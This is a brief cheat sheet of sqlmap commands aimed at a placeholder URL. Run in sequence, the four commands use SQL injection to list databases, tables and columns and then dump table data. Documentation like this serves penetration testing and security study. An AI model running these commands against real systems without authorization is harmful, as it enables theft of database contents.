# SqlMap basic

```bash
# scan db name
sqlmap -u https://example.com/prod?id=1 --dbs
# scan table
sqlmap -u https://example.com/prod?id=1 -D [db name] --tables
# scan column
sqlmap -u https://example.com/prod?id=1 -D [db name] -T [tb name] --columns
# show data
sqlmap -u https://example.com/prod?id=1 -D [db name] -T [tb name] --dump
```